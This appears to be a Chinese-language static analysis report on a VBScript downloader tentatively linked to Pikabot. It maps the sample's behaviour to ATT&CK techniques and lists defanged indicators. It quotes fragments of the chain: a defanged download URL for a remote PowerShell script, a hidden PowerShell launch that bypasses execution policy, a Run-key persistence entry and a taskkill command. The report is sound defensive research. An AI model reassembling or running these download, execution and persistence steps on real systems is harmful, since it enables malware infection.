---
title: "恶意样本分析：Pikabot (candidate)（other · vbe · 72c89b13）"
published: 2026-11-05
draft: false
description: "恶意（置信度低）：Pikabot (candidate) · downloader/loader/dropper · 难度 easy · 纯静态分析"
tags: ["Pikabot", "downloader", "loader", "dropper"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **Pikabot (candidate)**（存疑） · 置信度 **低**
> 
> 别名：Pikabot loader
> 
> 样本是可直接阅读的明文 VBScript，代码完整暴露了下载并执行远程 PowerShell、写入用户目录、注册表 Run 键持久化、以及结束父进程的流程；下载地址、落地路径与持久化键均为脚本内硬编码，非推测。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **Pikabot (candidate)** · 别名 Pikabot loader · _存疑_ |
| 置信度 | **低** |
| 行为类 | downloader · loader · dropper |
| 难度 | easy |
| 首次出现 | 2026-11-04 15:54:45 |
| 分析方法 | 纯静态分析 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/72c89b13e16cb569916f078963a85fd5b372c6b32eeb97b4f8d3b33a94b9001c/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">下载远程PowerShell载荷</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105, T1071.001</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">创建隐藏工作目录</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036, T1105</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">随机命名临时脚本</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036.005</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">伪装系统更新副本</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036.005</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">隐藏窗口执行脚本</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1059.001, T1564.003</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `72c89b13e16cb569916f078963a85fd5b372c6b32eeb97b4f8d3b33a94b9001c` |
| MD5 | _未记录_ |
| 大小 | 5,343 字节（5.2 KB） |
| 类型 | other · `vbe` |

## 行为分析

共 **8** 条行为，每条都挂了证据，且全部静态可得。

### 1. 下载远程PowerShell载荷

`T1105, T1071.001` · 置信度 **高** · 静态

通过 MSXML2.XMLHTTP 以 GET 请求 hxxps://hartford-consult[.]org/aq.ps1，检查 HTTP 状态码为 200 后把响应正文写入临时 .ps1 文件。

> **证据**：字符串偏移 413 m_url = "hxxps://hartford-consult[.]org/aq.ps1"；偏移 1733 m_http.Open "GET", m_url, False；偏移 2050 CreateTextFile(m_tempPayload, True)
> 
> **来源**：`ev-000001` · `ev-000002`

### 2. 创建隐藏工作目录

`T1036, T1105` · 置信度 **高** · 静态

创建 C:\Temp\ 和 %APPDATA%\WindowsSystem\ 两个目录，后者使用系统环境变量展开，落地路径随用户变化。

> **证据**：偏移 468 m_stageDir = "C:\Temp\"；偏移 501 ExpandEnvironmentStrings("%APPDATA%") & "\WindowsSystem\"；偏移 4550 m_fs.CreateFolder path
> 
> **来源**：`ev-000001` · `ev-000002`

### 3. 随机命名临时脚本

`T1036.005` · 置信度 **高** · 静态

用 8 位大小写字母与数字随机串生成 C:\Temp\<随机>.ps1，规避固定文件名检测；随机源为 VBScript Rnd。

> **证据**：偏移 1357 m_tempPayload = m_stageDir & RandomTag & ".ps1"；偏移 4747 pool = "A-Za-z0-9"
> 
> **来源**：`ev-000001` · `ev-000002`

### 4. 伪装系统更新副本

`T1036.005` · 置信度 **高** · 静态

把下载的临时脚本复制为 %APPDATA%\WindowsSystem\system_update.ps1，名称伪装成系统更新组件并覆盖同名文件。

> **证据**：偏移 1416 m_persistPayload = m_appDataDir & "system_update.ps1"；偏移 2426 CopyFile m_tempPayload, m_persistPayload, True
> 
> **来源**：`ev-000001` · `ev-000002`

### 5. 隐藏窗口执行脚本

`T1059.001, T1564.003` · 置信度 **高** · 静态

以 WScript.Shell.Run 启动 powershell.exe，参数包含 -WindowStyle Hidden 与 -ExecutionPolicy Bypass，窗口样式 0 表示完全隐藏。

> **证据**：偏移 1479 m_launchCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ..."；偏移 2674 m_shell.Run m_launchCmd, 0, False
> 
> **来源**：`ev-000001` · `ev-000002`

### 6. 注册表Run键持久化

`T1547.001` · 置信度 **高** · 静态

通过 WScript.Shell.RegWrite 在 HKCU\Software\Microsoft\Windows\CurrentVersion\Run 下写入 WindowsSystemUpdate，值为隐藏 PowerShell 执行持久化副本，实现用户登录自启动。

> **证据**：偏移 2915 runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"；偏移 2986 valueName = "WindowsSystemUpdate"；偏移 3146 RegWrite(...)
> 
> **来源**：`ev-000001` · `ev-000002`

### 7. 轮询Office加载器进程

`T1047, T1057` · 置信度 **高** · 静态

最多循环 60 秒，每秒通过 WMI 查询 SELECT * FROM Win32_Process WHERE Name = 'AddInProcess32.exe'，命中后等待 3 秒再执行清理动作。

> **证据**：偏移 3499 ProcessRunning("AddInProcess32.exe")；偏移 3943 GetObject("winmgmts:\\.\root\cimv2")；偏移 3999 Win32_Process 查询
> 
> **来源**：`ev-000001` · `ev-000002`

### 8. 结束父PowerShell进程树

`T1057, T1070.004` · 置信度 **高** · 静态

检测到 AddInProcess32.exe 后执行 taskkill /im powershell.exe /T，结束本机全部 PowerShell 进程树，随后删除 C:\Temp 下的临时脚本。

> **证据**：偏移 4273 m_shell.Run "taskkill /im powershell.exe /T", 0, True；偏移 5106 DeleteFile m_tempPayload, True
> 
> **来源**：`ev-000001` · `ev-000002`


## IOC（已去武器化）

### 网络

:::caution
**待动态验证**：上述地址为静态分析所得，分析环境网络隔离下未观察到成功的连接或会话，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://hartford-consult[.]org/aq[.]ps1` | 443 | download | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `C:\Temp\<8位随机字母数字>.ps1`
- `%APPDATA%\WindowsSystem\system_update.ps1`

**注册表**

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystemUpdate`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `hxxps://hartford-consult[.]org/aq.ps1` | 是 | 静态 |
| `stage_dir` | `C:\Temp\` | 是 | 静态 |
| `install_path` | `%APPDATA%\WindowsSystem\system_update.ps1` | 是 | 静态 |
| `persistence` | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystemUpdate` | 是 | 静态 |
| `launch_command` | `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "<script>"` | 是 | 静态 |
| `watchdog_process` | `AddInProcess32.exe` | 否 | 静态 |
| `encryption_algo` | `none` | 否 | 静态 |
| `campaign_id` | `-` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不能仅凭脚本周期性检查 AddInProcess32.exe 就断言本文件自身实施进程注入；注入若存在，发生在其下载的 PowerShell 第二阶段，本文件只负责等待并结束父进程。
- 未取回 aq.ps1，不能断言最终载荷类型（勒索软件、窃密程序或远控木马），也不能断言除 hartford-consult[.]org 外不存在其他 C2。
- 脚本内没有加密或文件加密逻辑，不应将其归类为 ransomware 或带加密配置的 stealer。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 纯静态分析 |
| 脱壳 | 否 |

**局限与待验证**

1. 该格式无隔离动态通道，未执行样本，全部结论来自静态代码与字符串证据；C2 与持久化仅完成静态确认，待动态复核。
2. 下载地址 hxxps://hartford-consult[.]org/aq.ps1 未取回，第二阶段内容、最终载荷家族与完整 C2 基础设施未知。
3. 家族归属为低置信候选：AddInProcess32.exe 等待与清理行为与 Pikabot 类加载器相符，但缺少配置提取或多引擎佐证。
4. 脚本对第二阶段注入的目标进程、加密方式与通信协议不作说明，需在可联网的隔离环境取回载荷后进一步分析。

## 证据索引

<details>
<summary>展开 2 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 字符串提取 | 抽取 155 条 ASCII 字符串，包含下载 URL、C:\Temp、%APPDATA%\WindowsSystem、Run 键、AddInProcess32.exe 与 taskkill 命令 |
| `ev-000002` | evidence.record | 只读静态解析：确认 sha256/大小/熵、纯 ASCII VBScript 格式，并复原完整执行链（下载→落地→执行→持久化→进程清理） |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
